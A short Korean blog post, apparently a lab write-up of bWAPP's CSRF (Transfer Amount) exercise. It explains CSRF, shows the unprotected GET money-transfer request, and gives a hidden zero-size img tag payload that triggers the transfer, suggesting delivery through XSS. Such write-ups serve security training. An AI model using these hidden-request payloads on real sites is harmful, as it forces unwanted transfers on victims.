---
layout: single
title: (bWAPP)CSRF (Transfer Amount)
categories: bwapp
tag: [CSRF, bwapp, bee box, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---

# 취약점 설명
> CSRF 공격은 사용자의 의도와는 무관하게 공격자가 특정 웹 애플리케이션에 요청을 보낼 수 있게 하는 공격이며, 공격자가 사용자의 권한을 이용해 임의의 요청을 서버에 보낼 수 있습니다. 이로 인해 사용자가 의도하지 않은 작업이 수행될 수 있다.

![그림 1-1](/assets/image/bwapp/csrf/CSRF%20(Transfer%20Amount)/image.png)
- 송금 기능이 존재하고 있다.

```
bWAPP/csrf_2.php?account=123-45678-90&amount=500&action=transfer
```

- 송금을 하게되면, 또한 아무런 보안 기법이 적용되어 있지 않은 상태로 GET 방식으로 데이터가 전송된다.

![그림 1-2](/assets/image/bwapp/csrf/CSRF%20(Transfer%20Amount)/image-1.png)
- 송금시 보유중인 유료가 차감되며, 특정 계좌로 송금하게 된다.
- 이 또한 계좌 파라미터인 account값을 조작하여 악성 스크립트를 제작하여 xss 와 연계하여 희생자에게 전달할 수 있다.

```
<img src="http://ip/bWAPP/csrf_2.php?account=123-45678-90&amount=500&action=transfer" height=0 width=0>
```